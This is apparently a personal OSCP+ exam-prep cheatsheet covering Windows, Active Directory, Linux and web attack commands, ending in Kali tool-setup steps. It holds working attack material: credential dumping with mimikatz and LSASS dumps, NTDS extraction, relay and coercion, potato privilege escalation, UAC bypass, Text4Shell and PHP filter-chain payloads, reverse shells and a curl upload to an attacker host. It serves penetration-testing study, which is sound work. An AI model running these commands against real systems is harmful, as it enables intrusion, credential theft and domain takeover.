> Run these in a spare tab **while you manually attack** 80/443/445 — they organize the busy-work; they don't find the path for you. Never wait on them, never rely on them blindly.

---

# [ADDENDUM-PARITY]  extra tools from popular public cheatsheets (parity pass)
> Cross-checked against widely-used community notes (e.g. saisathvik1's). These fill the last gaps. Most are **alternatives** to tools you already have — know they exist; you don't need all of them.

## [PARITY-ENUM]  alternative enumerators
```
dirsearch -u http://$T -e php,txt,html        # web dir brute (alt to feroxbuster/ffuf/gobuster)
dnsenum $DOMAIN                                # DNS enum (alt to dnsrecon); dnsenum --dnsserver $DC $DOMAIN
impacket-services $DOMAIN/U:P@$T list          # enumerate/Start/Stop Windows services remotely
joomscan --url http://$T                       # Joomla (alt to droopescan joomla)
# NOTE: passive-OSINT tools (whois, Shodan, Netcraft, Google-dorking, gitleaks) are for
# real-world/course recon — NOT used on OSCP exam targets (you're given IPs). Skip them for the exam.
```

## [PARITY-WIN-ENUM]  alternative Windows privesc enumerators (pick one if winPEAS is blocked)
```
powershell -ep bypass -c ". .\PrivescCheck.ps1; Invoke-PrivescCheck"   # PrivescCheck.ps1
.\jaws-enum.ps1 -OutputFilename jaws.txt                                 # JAWS
# plus already-covered: winPEAS, PowerUp (Invoke-AllChecks), Seatbelt, accesschk
icacls "C:\path\to\file_or_dir"        # check NTFS permissions (who can write) — key for service/binary hijack
icacls "C:\Program Files\svc\bin.exe"  # (F)=full,(M)=modify,(W)=write → writable by you = privesc
tasklist /v                            # running processes + owners (find privileged procs)
tasklist /svc                          # map processes → services
Test-NetConnection -ComputerName $T -Port 445    # test a port from a Windows host (pivot recon, no nmap)
PsLoggedon.exe \\$T                    # who is logged on where (pick lateral-movement targets)
```

## [PARITY-LIN-ENUM]  alternative Linux privesc enumerators (if linpeas unavailable)
```
./LinEnum.sh -t                 # thorough
./linuxprivchecker.py           # classic
./unix-privesc-check standard   # older but useful
# already covered: linpeas.sh, pspy, manual [LINUX-PRIVESC-MANUAL]
```

## [PARITY-POTATO]  SeImpersonate → SYSTEM, full variant list (try in this order)
```
PrintSpoofer64.exe -i -c cmd        # modern default, works 2016–2022
GodPotato-NET4.exe -cmd "cmd /c whoami"
JuicyPotatoNG.exe -t * -p cmd.exe   # when the above fail
RoguePotato.exe -r $IP -e "cmd.exe" -l 9999
SharpEfsPotato.exe -p C:\Windows\System32\cmd.exe -a "/c whoami"   # EFSRPC variant
# concept: all abuse SeImpersonate/SeAssignPrimaryToken to steal SYSTEM token. If one fails, try the next.
```

## [PARITY-AD-RUBEUS]  Rubeus (Windows-side Kerberos — alt to impacket when you have a Windows shell)
```
Rubeus.exe kerberoast /outfile:tgs.txt              # Kerberoast → crack -m 13100
Rubeus.exe asreproast /format:hashcat /outfile:ar.txt   # AS-REP roast → -m 18200
Rubeus.exe dump                                     # dump tickets in memory
Rubeus.exe asktgt /user:U /rc4:<ntlm> /ptt          # overpass-the-hash (hash → TGT → inject)
Rubeus.exe s4u /user:svc /rc4:<hash> /impersonateuser:administrator /msdsspn:cifs/host /ptt  # constrained deleg
# ticket use (Pass-the-Ticket): Rubeus.exe ptt /ticket:<b64-or-kirbi>
```

## [PARITY-NTDS]  extract NTDS.dit on a DC (SeBackup / local admin on DC) → all domain hashes
```
# method 1 - VSS snapshot (vssadmin/diskshadow), then copy NTDS.dit + SYSTEM:
vssadmin create shadow /for=C:
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopyN\Windows\NTDS\NTDS.dit C:\Temp\
reg save HKLM\SYSTEM C:\Temp\SYSTEM
# method 2 - diskshadow script (SeBackup):  diskshadow /s script.txt   (expose+copy)
# method 3 - impacket over the network (needs DCSync rights):
impacket-secretsdump -just-dc $DOMAIN/U:P@$DC
# then offline:
impacket-secretsdump -ntds NTDS.dit -system SYSTEM LOCAL
```

## [PARITY-PTH-EXTRA]  pass-the-hash tool variants
```
pth-winexe -U 'DOMAIN/user%LMHASH:NTHASH' //$T cmd.exe    # classic PtH shell
# already covered: nxc -H, evil-winrm -H, impacket-psexec/wmiexec -hashes :NT
```

## [PARITY-AD-REPORT]  AD reporting (optional, deeper analysis)
```
# PlumHound / PingCastle = generate AD posture reports from BloodHound/AD data.
# Nice-to-have for study; on the exam BloodHound (Vol 5 [AD-BLOODHOUND]) is enough.
```

---

# [ADDENDUM-PARITY-2]  broader sweep (0xsyr0/OSCP + AD cheatsheets)
> Cross-checked against more large community repos. Added the **exam-relevant** items only. Skipped OSEP/CRTP-level tradecraft (Skeleton Key, custom SSP/mimilib, SID-History, Forest-Trust tickets, PrivExchange, DSRM) — *not* on OSCP; don't study them for this exam.

## [AD-ADCS]  Active Directory Certificate Services abuse (Certipy) — increasingly OSCP-relevant
**WHAT:** misconfigured certificate templates let a normal user enroll a cert **as** a privileged user → get their NT hash/TGT. Attack IDs **ESC1–ESC8**.
```
certipy find -u U@$DOMAIN -p P -dc-ip $DC -vulnerable -stdout    # find vulnerable templates
# ESC1 (template allows requester-supplied SAN): request a cert as admin
certipy req -u U@$DOMAIN -p P -ca <CA-NAME> -template <TMPL> -upn administrator@$DOMAIN
certipy auth -pfx administrator.pfx -dc-ip $DC                    # → NT hash + TGT for admin
# ESC8 (web enrollment + relay): coerce a DC → ntlmrelayx to http://CA/certsrv → DC cert → DCSync
```
Tools: **Certipy** (Linux), **Certify.exe** + **Rubeus** (Windows), **PassTheCert**. Cross-ref `[CVE-HITS]` ADCS.

## [PARITY2-CRED-DUMP]  credential dumping — the full toolbox
```
# mimikatz (Windows, admin):
  privilege::debug
  sekurlsa::logonpasswords          # plaintext/NTLM from LSASS
  sekurlsa::ekeys                    # Kerberos keys
  sekurlsa::tickets /export          # export TGT/TGS
  lsadump::sam                       # local SAM hashes
  lsadump::secrets                   # LSA secrets (service creds)
  lsadump::dcsync /user:$DOMAIN\krbtgt   # DCSync a user
# no mimikatz on the box? dump LSASS then parse offline:
  # dump:  procdump -ma lsass.exe lsass.dmp   OR  rundll32 comsvcs.dll,MiniDump <pid> lsass.dmp full
  pypykatz lsa minidump lsass.dmp    # parse the dump on Kali
# remote (from Kali, with admin creds):
  lsassy -u U -p P -d $DOMAIN <hosts>      # remote LSASS dump+parse
  nxc smb <hosts> -u U -p P --lsa --sam    # LSA + SAM via netexec
# app/browser creds on a Windows box:
  LaZagne.exe all                    # dumps browsers, wifi, apps, etc.
```

## [PARITY2-COERCE]  auth coercion + relay (for delegation/ADCS paths)
```
petitpotam.py -u U -p P <listener-ip> $DC        # coerce DC to auth to you
printerbug.py $DOMAIN/U:P@$DC <listener-ip>       # MS-RPRN "printer bug"
coercer coerce -u U -p P -t $DC -l <listener-ip>  # multi-method coercion
# relay the coerced auth:
impacket-ntlmrelayx -t ldaps://$DC --delegate-access      # RBCD, or
impacket-ntlmrelayx -t http://<CA>/certsrv/certfnsh.asp --adcs  # ESC8 → DC cert
mitm6 -d $DOMAIN                                   # IPv6 DNS takeover (pair with ntlmrelayx -6)
```

## [PARITY2-DNSADMINS]  DNSAdmins group → SYSTEM on the DC
```
# if your user is in DNSAdmins, load a malicious DLL as the DNS service (SYSTEM):
dnscmd $DC /config /serverlevelplugindll \\$IP\share\evil.dll
sc \\$DC stop dns & sc \\$DC start dns            # DLL executes as SYSTEM on the DC
# build DLL:  msfvenom -p windows/x64/exec CMD='...' -f dll  (or a custom add-user DLL)
```
Related: **Backup Operators** membership → back up SAM/SYSTEM/NTDS (`diskshadow`/`reg save`) → dump hashes (see `[PARITY-NTDS]`).

## [PARITY2-MSSQL]  MSSQL deeper (PowerUpSQL + linked servers)
```
# PowerUpSQL (Windows):
Get-SQLInstanceDomain ; Get-SQLServerInfo -Instance <srv>
Get-SQLServerLinkCrawl -Instance <srv> -Query 'exec master..xp_cmdshell ''whoami'''
# manual linked-server RCE (execute on a trusted linked box):
EXEC ('sp_configure ''xp_cmdshell'',1;reconfigure;exec xp_cmdshell ''whoami''') AT [LINKEDSRV]
# from Kali:  impacket-mssqlclient $DOMAIN/U:P@$T -windows-auth   → enable_xp_cmdshell; xp_cmdshell whoami
```

## [PARITY2-SHELLS-PIVOT]  Windows-side transfer/pivot extras
```
# Powercat (PowerShell netcat): reverse shell / file transfer
powercat -c $IP -p 443 -e cmd.exe            # reverse   | -l -p 443 -e cmd.exe = bind
# RunasCs (run as another user from a non-interactive shell — huge when you have creds but no RDP/WinRM):
RunasCs.exe <user> <pass> "cmd /c whoami" -r $IP:443      # -r = reverse connect
# FullPowers (restore stripped privileges for a service account → regain SeImpersonate):
FullPowers.exe
# Windows port forwarding without chisel:
netsh interface portproxy add v4tov4 listenport=8080 connectaddress=<internal-ip> connectport=80
plink.exe -R 3389:127.0.0.1:3389 $USER@$IP    # SSH remote-forward from Windows (plink)
socat TCP-LISTEN:8080,fork TCP:<internal>:80  # simple relay (Linux pivot)
```

## [PARITY2-WEB-EXTRA]
```
phpggc Monolog/RCE1 system 'id' -b            # generate PHP deserialization payload (gadget chains)
python3 jwt_tool.py <JWT> -T                    # interactively tamper/forge a JWT (alg confusion, etc.)
python3 ntlm_theft.py -g all -s $IP -f doc      # generate malicious files (.lnk/.scf/.xml…) to capture NetNTLM
gittools / git-dumper                           # dump exposed .git → source + secrets
```

## [PARITY2-WORDLIST-BRUTE]
```
cewl -d 2 -m 5 -w words.txt http://$T          # scrape the site into a custom wordlist
crunch 6 8 -t @@@@%%% -o w.txt                  # generate patterned candidates
medusa -h $T -u U -P rockyou.txt -M ssh         # brute alt to hydra
# kernel-exploit suggesters:
#   Windows: wesng / windows-exploit-suggester / Watson / Sherlock (from `systeminfo`)
#   Linux:   linux-exploit-suggester (LES) / linux-exploit-suggester2 (from `uname -a`)
```

## [PARITY2-ENUM-EXTRA]
```
masscan -p1-65535 $T --rate 1000 -oL masscan.txt   # very fast port sweep (ALWAYS re-verify with nmap -sCV)
nmblookup -A $T                                     # NetBIOS names (alt SMB recon)
# AD enum alternatives to PowerView: SharpView.exe, AdFind.exe, ADExplorer, adidnsdump, ldapdomaindump
```

---

# [GAP-FILL-FINAL]  self-audit gap fills (things every OSCP toolkit should have)

## [AD-DOUBLEHOP]  the "double hop" problem (bites everyone in AD)
```
SYMPTOM: your evil-winrm / WinRM / PSRemoting shell works, but FROM it you can't reach a THIRD
         host or a network share (Access Denied / "no creds") — your creds don't forward past hop 1.
WHY: NTLM/WinRM doesn't delegate your credential to the next hop.
FIXES (pick one):
 - Work from YOUR Kali through a pivot instead, passing creds directly ([PIVOT-QUICK] + nxc/impacket -u/-p or -H)
 - Kerberos ticket: getTGT.py $DOMAIN/U:P → export KRB5CCNAME=U.ccache → tools with -k -no-pass
 - Pass creds explicitly each command:
     $p=ConvertTo-SecureString 'PASS' -AsPlainText -Force
     $c=New-Object System.Management.Automation.PSCredential('DOMAIN\U',$p)
     Invoke-Command -ComputerName host2 -Credential $c -ScriptBlock { whoami }
 - Get a full interactive session on the box (RDP / RunasCs) so creds are present, then act locally
```

## [AD-LAPS-GMSA]  read managed passwords (when you have the rights)
```
# LAPS (randomized local-admin password stored in AD; some users/groups can read it):
netexec ldap $DC -u U -p P -M laps                 # dump LAPS passwords you can read
netexec smb  $T  -u U -p P --laps                   # or authenticate using LAPS pw
ldapsearch -x -H ldap://$DC -D 'U@$DOMAIN' -w P -b "dc=..,dc=.." "(ms-Mcs-AdmPwd=*)" ms-Mcs-AdmPwd
# gMSA (group Managed Service Account; readable by authorized principals):
python3 gMSADumper.py -u U -p P -d $DOMAIN           # → gMSA NT hash → PtH
netexec ldap $DC -u U -p P --gmsa
```

## [WIN-UAC-BYPASS]  medium-integrity admin → high-integrity (bypass UAC)
```
# You're a LOCAL ADMIN but the shell is medium-integrity (whoami /groups shows no "High Mandatory").
# fodhelper:
reg add "HKCU\Software\Classes\ms-settings\Shell\Open\command" /d "C:\Temp\rev.exe" /f
reg add "HKCU\Software\Classes\ms-settings\Shell\Open\command" /v DelegateExecute /f
start fodhelper.exe                                   # runs your payload high-integrity
# eventvwr variant: HKCU\Software\Classes\mscfile\shell\open\command → payload, run eventvwr.exe
# or use the UACME project. Only needed when you must be elevated (e.g., to dump SAM).
```

## [WIN-PRIV-GROUPS]  privileged groups → SYSTEM/DC (besides Domain/Enterprise Admins)
```
Server Operators  → modify/restart a DC service → sc config <svc> binPath= "..." → SYSTEM on DC
Backup Operators  → back up SAM/SYSTEM/NTDS → dump hashes (SeBackup, [PARITY-NTDS])
DnsAdmins         → load DLL as DNS service → SYSTEM on DC ([PARITY2-DNSADMINS])
Account Operators → create/modify most users & groups (not protected ones)
Print Operators   → SeLoadDriverPrivilege → vulnerable-driver exploit
# check your groups:  whoami /groups   |  net user %username% /domain
```

## [LINUX-LD-LIBRARY]  LD_LIBRARY_PATH / shared-lib hijack via sudo
```
# sudo -l shows env_keep+=LD_LIBRARY_PATH (or LD_PRELOAD): hijack a library the allowed binary loads.
gcc -shared -fPIC -o /tmp/evil.so evil.c            # evil.c defines the function the binary calls (spawns shell)
sudo LD_LIBRARY_PATH=/tmp <allowed-binary>          # or sudo LD_PRELOAD=/tmp/evil.so <allowed-binary>
```

## [WEB-403-BYPASS]  a path returns 403/401 — try to get in
```
paths:   /admin//  /admin/.  /./admin  /admin%20  /admin%09  /admin?  /admin#  /ADMIN  /admin/..;/
headers: X-Forwarded-For: 127.0.0.1 | X-Original-URL: /admin | X-Rewrite-URL: /admin | Referer: same-site
methods: swap GET→POST/HEAD/PUT/TRACE ; try HTTP/1.0
tools:   ffuf with the above; the "bypass-403"/"4-ZERO-3" scripts
```

## [WEB-PUT-WEBDAV]  writable HTTP PUT / WebDAV → upload a shell
```
nmap -p80 --script http-put --script-args http-put.url='/shell.php',http-put.file='./shell.php' $T
curl -X PUT http://$T/shell.php --data-binary @shell.php     # if PUT is allowed → browse it
davtest -url http://$T/webdav                                 # probe WebDAV (what execs?)
cadaver http://$T/webdav                                      # interactive: put shell.php / shell.asp
# WebDAV often has default creds (wampp:xampp) → try, or hydra http-get
```

## [WEB-PARAM-MINING]
```
arjun -u http://$T/page                              # dedicated hidden-parameter discovery
wfuzz -c -z file,/usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -u 'http://$T/page?FUZZ=1' --hw 0
# (ffuf param brute already in [WEB-CONTENT])
```

## [ENUM-MISC-PORTS]  less-common services worth a look
```
23   Telnet    → telnet $T 23 ; banner + default/weak creds (often network devices)
79   finger    → finger root@$T ; finger @$T  (user enumeration on old *nix)
110/143 POP3/IMAP → nc $T 110 ; try found creds; read mail (creds/loot)
513/514 rlogin/rsh → rlogin -l root $T (legacy trust relationships)
873  rsync     → rsync $T::            (list modules) ; rsync -av $T::<mod>/ loot/  (pull, often anon)
2049 NFS       → already [ENUM-NFS]
5900 VNC       → vncviewer $T ; nmap --script vnc-info,realvnc-auth-bypass -p5900 $T ; hydra vnc
9200 Elastic   → curl $T:9200/_cat/indices ; CVE-2015-1427 (old) [CVE-HITS]
```

## [SHELL-REVSHELLS]  generator bookmark
```
# https://www.revshells.com — builds any reverse shell (bash/python/php/powershell/nc/…) with your
# IP+port pre-filled, incl. URL-encoded + msfvenom variants. Keep an OFFLINE copy for exam day.
# (Core one-liners are already in [SHELL-QUICK]; this is the "under pressure, just copy it" fallback.)
```

---

# [ADDENDUM-PARITY-3]  deep-mine additions (0xsyr0/OSCP sweep)
> Systematic extraction from the deepest single-file community cheatsheet. These are the genuine gaps it had that this KB didn't.

## [PARITY3-INSTALL]  install/setup commands that were missing
```
sudo apt install -y krb5-user                 # Kerberos client (kinit, klist) for ccache/AD ticket workflow
sudo apt install -y mingw-w64 gcc-multilib    # cross-compile Win exe + build 32-bit Linux (also in [KALI-SETUP])
git clone https://github.com/ropnop/impacket_static_binaries   # precompiled impacket to DROP ON a target (no python needed)
# run a python exploit that has dependencies, cleanly:
python3 -m venv venv && source venv/bin/activate && pip install -r requirements.txt
```

## [PARITY3-SUDOEDIT]  CVE-2023-22809 — sudoedit arbitrary file write → root
```
# If `sudo -l` allows sudoedit (or a *edit rule) and sudo is 1.8.0–1.9.12p1:
# the EDITOR var accepts an extra file via "--", letting you edit ANY root-owned file.
EDITOR="vim -- /etc/passwd"  sudoedit /path/to/allowed/file   # then add a root user line → su
# (companions already in [LINUX-SUDO]: CVE-2019-14287 `sudo -u#-1`, CVE-2021-3156 Baron Samedit)
```

## [PARITY3-LFI-FILTERCHAIN]  LFI → RCE with NO writable log (php filter chain)
```
# when you have a pure LFI (?page=) but no log/upload to poison — generate a filter-chain payload:
python3 php_filter_chain_generator.py --chain '<?php system($_GET["c"]); ?>'
# paste the produced php://filter... string into the LFI param, then add &c=id   ([WEB-LFI])
```

## [PARITY3-FFUF]  ffuf flags worth knowing
```
ffuf -w list.txt -u http://$T/FUZZ -ac              # -ac = AUTO-calibrate (auto-filters junk responses)
ffuf -w list.txt -u http://$T/FUZZ -mc all -fs 0    # -mc all match every code, then filter by size
ffuf -w list.txt -u http://$T/FUZZ -e .php,.txt,.bak -recursion
ffuf -w users.txt -u http://$T/admin/FUZZ.php -b "PHPSESSID=xxx" -fw 2644   # authenticated fuzz + filter words
```

## [PARITY3-KERBEROS]  ticket workflow (mostly in `[KERBEROS-QUICK]`, completing it)
```
impacket-getTGT $DOMAIN/$U:'PASS'                    # → $U.ccache
export KRB5CCNAME=$(realpath $U.ccache)              # tell tools to use it
klist                                               # show tickets you hold
impacket-ticketConverter $U.kirbi $U.ccache          # .kirbi (Windows/Rubeus) → .ccache (Linux)
impacket-mssqlclient -k $T.$DOMAIN                   # -k = use the Kerberos ticket (no password)
```

## [PARITY3-MISC]  small but useful
```
snmpwalk -v2c -c public $T nsExtendObjects           # scripts snmpd runs (often as root → privesc lead)
hashcat -a 3 -m 0 hash.txt ?u?l?l?l?d?d?d?d           # mask attack (bruteforce a pattern)
hashcat -a 6 -m 0 hash.txt wordlist.txt ?d?d?d       # hybrid: wordlist + appended mask
# DirtyCOW (old kernels) compile:  gcc -pthread dirty.c -o dirty -lcrypt ; ./dirty <newpass>
# Shocker (CGI shellshock container/host file read):  ./shocker <path-to-read>
# start services on Kali to receive:  sudo systemctl start ssh   (then scp target→you)
```

> **Honesty note on "everything":** this KB carries the **commands you actually type** (the 80/20) and links the long tail (`[RESOURCES]`). Multi-file Obsidian repos (fatalxs, LeonardoE95's module notes) can't be fully mined from a README, and *no* finite notes file holds every flag of every tool — that's what GTFOBins/HackTricks/`--help` are for. The systematic sweeps are done; remaining micro-gaps are best found by **using this on real boxes**.

---

# [ADDENDUM-PARITY-4]  more from a PEN-200-aligned cheatsheet (final parity)

## [PARITY4-TRANSFER]  upload server (target → your Kali)
```
pip3 install uploadserver                             # one time
python3 -m uploadserver 8000                          # Kali: accepts uploads at /upload
# from target:  curl.exe http://<KaliIP>:8000/upload -F files=@C:\loot\file.zip   (Linux: curl -F ...)
```

## [PARITY4-SIGMAPOTATO]  SigmaPotato (newest Potato — try when GodPotato/PrintSpoofer fail)
```
.\SigmaPotato.exe "net localgroup Administrators <you> /add"    # SeImpersonate → run as SYSTEM
.\SigmaPotato.exe --revshell <KaliIP> 4444                      # direct reverse shell
```
Order to try SeImpersonate→SYSTEM: PrintSpoofer → GodPotato → **SigmaPotato** → JuicyPotatoNG/RoguePotato (`[WINDOWS-TOKENS]`).

## [PARITY4-LIGOLO]  Ligolo-ng current syntax (newer than `ip tuntap`)
```
sudo ligolo-proxy -selfcert                            # on Kali
./agent -connect <KaliIP>:11601 -ignore-cert           # on the pivot host
# in the ligolo console:
interface_create --name ligolo
start --tun ligolo
route_add --name ligolo --route 172.16.247.0/24        # then run tools natively at 172.16.247.x
```

## [PARITY4-WINLOOT]  Windows cred/hive dump extras
```
reg save hklm\sam sam & reg save hklm\system system & reg save hklm\security security   # +security hive (LSA/cached)
impacket-secretsdump -sam sam -system system -security security LOCAL                    # parse offline
Get-WinEvent -MaxEvents 30 | findstr backup            # event logs sometimes leak creds/hints
```

## [PARITY4-ENABLE-RDP]  turn on RDP after you're admin (for a GUI / stable access)
```
reg add "HKLM\System\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
netsh advfirewall firewall set rule group="remote desktop" new enable=Yes
net localgroup "Remote Desktop Users" <you> /add
```

## [PARITY4-AD-EXTRA]  PowerView + trust enumeration extras
```
setspn -L <svcaccount>                                 # SPNs of an account (kerberoast targets)
Get-NetUser -SPN | select samaccountname,serviceprincipalname
Get-NetSession -ComputerName files04                   # who's logged on where (lateral targeting)
Get-ObjectAcl -Identity <user> | ? {$_.ActiveDirectoryRights -eq "GenericAll"} | select SecurityIdentifier
Convert-SidToName S-1-5-21-...-1104                     # SID → name
Find-DomainShare ; Find-LocalAdminAccess               # shares / where you're local admin
nltest /domain_trusts /v                               # enumerate domain trusts
```

## [PARITY4-CREDSNIFF]  Linux: catch creds/cron in real time (on a shell)
```
watch -n 1 "ps -aux | grep -i pass"                    # spot a process passing a password on its cmdline
sudo tcpdump -i lo -A | grep -i pass                   # sniff loopback (local service auth)
grep CRON /var/log/syslog                              # see what cron runs (privesc lead)
```

## [PARITY4-MISC]
```
snmpbulkwalk -v2c -c public $IP                         # faster than snmpwalk; sudo apt install snmp-mibs-downloader for readable OIDs
# Golden Ticket across a trust (child→parent): impacket-ticketer ... -extra-sid <parent-Enterprise-Admins-SID> Administrator
```

---

# [ADDENDUM-PARITY-5]  8-challenge-lab sweep (Secura, Medtech, OSCP-A/B/C, Zeus, Poseidon, Laser)
> Went through all 8 OSCP challenge-lab walkthroughs. **~95% was already covered** — these are the genuine additions. The labs also use many **app-specific RCEs** (Aerospike CVE-2020-13151, Mobile Mouse, Usermin 1.820, Vesta CP, FreeSWITCH mod_event_socket, unisql) — all handled by the generic flow: **identify version → `searchsploit` → run the PoC** (`[EXPLOIT-RESEARCH]`). Don't memorize them.

## [WEB-TEXT4SHELL]  CVE-2022-42889 (Text4Shell — Apache Commons Text 1.5–1.9)
Log4Shell's cousin: string interpolation → RCE. Drop into any reflected input / search field:
```
${script:javascript:java.lang.Runtime.getRuntime().exec('id')}
${url:UTF-8:http://<yourIP>/x}   ${dns:address|<yourIP>}     # confirm with an OOB callback first
```
Public PoC exists; pair with `[WEB-CMDINJ]`.

## [ENUM-JDWP]  Java Debug Wire Protocol (exposed debug port — often 8000/8787/high)
An open **JDWP** port = RCE (attach a debugger, execute code). Detect: `nmap -sV` shows *"Java Debug Wire Protocol"*. Exploit: `jdwp-shellifier.py` (or EDB 46501) → command exec → reverse shell.

## [WINDOWS-CREDS-PUTTY]  stored session creds (winPEAS finds these)
```
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s     # PuTTY proxy password often PLAINTEXT
# also: WinSCP (registry/.ini), FileZilla recentservers.xml / sitemanager.xml → saved FTP/SFTP creds
```

## [SMB-SLINKY]  nxc slinky — auto-drop a malicious .lnk in a writable share → capture NTLM
```
nxc smb $IP -u u -p p -M slinky -o NAME=important SERVER=<yourIP>   # drops a .lnk into writable shares
# then run `responder -A` / `ntlmrelayx` to catch the NetNTLMv2 when a user browses the folder
```
Automates the `.scf`/`.url`/`.lnk` drop from `[SMB-ATTACK]`. ⚠️ Exam: capturing via a file the user opens is fine; Responder **poisoning** is not (`[EXAM-RULES-2026]`).

## [PCAP-ANALYSIS]  you found a .pcap/.pcapng → mine it for creds
```
wireshark file.pcapng        # GUI: right-click → Follow TCP/HTTP Stream; File → Export Objects → HTTP
tshark -r file.pcap -Y 'http.authorization || ftp || telnet' -T fields -e text   # CLI quick pull
```
Look for: HTTP basic-auth, FTP/telnet plaintext, form logins, SMB/NTLM hashes (→ crack). Also `strings file.pcap | grep -i pass`.

## [AD-TRUST]  child → parent forest-trust escalation (Poseidon-style)
If you own a **child** domain (have its `krbtgt` hash) you can forge into the **parent/forest root** via SID history:
```
nltest /domain_trusts /v                                              # map trusts + get domain SIDs
impacket-secretsdump -just-dc-user krbtgt <child>/<u>:<p>@<childDC>    # child krbtgt hash
impacket-ticketer -nthash <krbtgt> -domain <child> -domain-sid <child-SID> \
    -extra-sid <parent-SID>-519 Administrator                         # golden ticket + Enterprise Admins SID
export KRB5CCNAME=Administrator.ccache
impacket-psexec <child>/Administrator@<parentDC> -k -no-pass          # own the forest root
```
The `-extra-sid ...-519` injects the **parent's Enterprise Admins** into your ticket = forest compromise.

---

# [BOF-DEPRECATED]  Buffer Overflow — ⚠️ NOT on the current OSCP+ exam
**The classic 25-pt Windows stack-BOF box was removed.** Know the *concept* for general knowledge; **do NOT spend prep time here.** Compact reference only:
```
1 Fuzz until crash → 2 msf-pattern_create -l N → send → find EIP → msf-pattern_offset -q <val>
3 Control EIP (offset) → 4 find bad chars (send \x00..\xff, compare in debugger, remove dupes)
5 !mona jmp -r esp -cpb '<badchars>' → pick a JMP ESP address (little-endian)
6 msfvenom -p windows/shell_reverse_tcp LHOST LPORT -b '<badchars>' -f c
7 buffer = "A"*offset + JMP_ESP + "\x90"*16 (NOP sled) + shellcode → nc -lvnp → win
```
If a modern exam box ever needs a memory bug, it'll come with source or a clear public PoC — treat it as `[EXPLOIT-RESEARCH]` + `[FIXING-EXPLOITS]`, not hand-crafted stack smashing.

---
*End Volume 8. This is your exam-day command center — combine with `[EXAM-DAY-FLOW]` (Vol 7) and `[FINAL-DAY-QUICK-REFERENCE]` (Vol 6).*


# OSCP+ KNOWLEDGE BASE — VOLUME 9
## 👶 BEGINNER FOUNDATIONS: KALI SETUP · GLOSSARY · FIRST-BOX WALKTHROUGHS

> Start here if the other volumes feel like a foreign language. Read `[NOOB-PRIMER]` (Vol 0) first, then this.

---

# [KALI-PREINSTALLED]  📦 what ships with Kali vs. what you must add

**How Kali packaging works:** the default Kali image installs the `kali-linux-default` metapackage — that's most of what you need. Bigger sets exist (`kali-linux-large`, `kali-linux-everything`) but you don't need them. A handful of OSCP-critical tools are **NOT** in the default image and you install them yourself. `[COMMUNITY]` + `[GENERAL]`

**Check what you already have (before installing anything):**
```
for t in nmap ffuf feroxbuster gobuster nikto sqlmap hydra john hashcat searchsploit \
  smbclient smbmap enum4linux crackmapexec netexec impacket-scripts evil-winrm responder \
  proxychains4 socat nc dnsrecon snmpwalk wpscan whatweb medusa cewl crunch; do
  printf "%-16s " "$t"; command -v "$t" >/dev/null && echo OK || echo "MISSING"; done
# list a metapackage's contents:  apt-cache depends kali-linux-default
```

### ✅ Tier 1 — usually PREINSTALLED (just verify, don't reinstall)
```
nmap · netcat(nc) · metasploit · burpsuite (Community) · sqlmap · nikto · dirb · gobuster
ffuf · feroxbuster · whatweb · wafw00f · wpscan · hydra · medusa · john · hashcat · hashid
smbclient · smbmap · enum4linux · crackmapexec · impacket-scripts · ldapsearch(ldap-utils)
snmpwalk(snmp) · onesixtyone · dnsrecon · dnsenum · responder · proxychains4 · socat
searchsploit(exploitdb) · curl · wget · ssh · tmux · cewl · crunch · git · python3
```
*(evil-winrm ships on recent Kali; if `command -v evil-winrm` says MISSING, install it — Tier 2.)*

### 🔧 Tier 2 — NOT default → `apt install` (the classic gaps)
```
sudo apt update && sudo apt install -y seclists netexec evil-winrm exploitdb sshuttle pspy \
  ldapdomaindump windapsearch nbtscan dnsutils
# ⭐ seclists is the #1 "why isn't this here already" gap — you need it for fuzzing wordlists.
# netexec (nxc) is the modern crackmapexec; keep both.
```

### 🐍 Tier 3 — Python tools → `pipx` (isolated, no dependency hell)
```
sudo apt install -y pipx && pipx ensurepath
pipx install bloodhound        # bloodhound-python collector
pipx install certipy-ad        # ADCS (ESC1-8)
pipx install bloodyAD          # LDAP/ACL abuse
pipx install mitm6             # IPv6 relay (lab only; exam poisoning banned)
# (lsassy, pypykatz often come with netexec deps; else: pipx install lsassy pypykatz)
```

### ⬇️ Tier 4 — NOT in apt at all → download from GitHub into `~/tools` (see `[KALI-SETUP]` step 4)
```
linpeas.sh · winPEASx64.exe · pspy64 · chisel(+.exe) · ligolo-ng (proxy+agent)
PrintSpoofer64.exe · GodPotato · RoguePotato · JuicyPotatoNG · SweetPotato · RunasCs.exe
PowerView.ps1 · PowerUp.ps1 · SharpHound.exe · Rubeus.exe · mimikatz.exe · kerbrute
# all URLs are in [RESOURCES] / [RESOURCES-MORE].
```

> **Automation shortcut (optional):** community scripts like **pimpmykali** (Dewalt) or WeaponizeKali install ~95% of these in one go. Fine for *setup* — but you must still **understand** each tool (the exam is manual). Don't let a script be a substitute for knowing what `netexec`/`ligolo`/`secretsdump` actually do.

---

# [KALI-SETUP]  🛠️ get your Kali ready ONCE (do this before practising)

Nothing kills momentum like discovering mid-box that a tool isn't installed. Do this setup once.

> 👉 For **what each tool does + whether it's allowed in the exam** (✅ / 1️⃣ MSF-one-target / ⚠️ / ⛔), see **`[KALI-TOOLBOX]`** (every exam-usable Kali tool grouped by phase). This section = *install* them; that section = *understand & use* them.

## 1) Update the system
```
sudo apt update && sudo apt full-upgrade -y
```

## 2) Install the core toolset (most are pre-installed on Kali; this fills gaps)
```
sudo apt install -y seclists wordlists nmap feroxbuster ffuf gobuster nikto \
  smbclient smbmap enum4linux nbtscan snmp onesixtyone ldap-utils \
  netexec impacket-scripts evil-winrm responder proxychains4 exploitdb \
  hashcat john sqlmap hydra dnsrecon curl wget git python3-pip pipx mingw-w64 gcc-multilib
sudo apt update && sudo apt install exploitdb    # installs searchsploit + local Exploit-DB (usually pre-installed on Kali)
searchsploit -u                                  # update the local Exploit-DB copy
# tools that are better via pipx (isolated):
pipx install bloodhound            # bloodhound-python collector
pipx install netexec               # if apt version is old (replaces crackmapexec)
```
*(If a package name errors, that tool may already exist or have a slightly different name — check with `which <tool>`. Don't panic; you rarely need all of them on one box.)*

## 3) Unzip rockyou (the main password wordlist) — one time
```
sudo gunzip /usr/share/wordlists/rockyou.txt.gz     # → /usr/share/wordlists/rockyou.txt
ls -l /usr/share/seclists                            # confirm SecLists is there
```

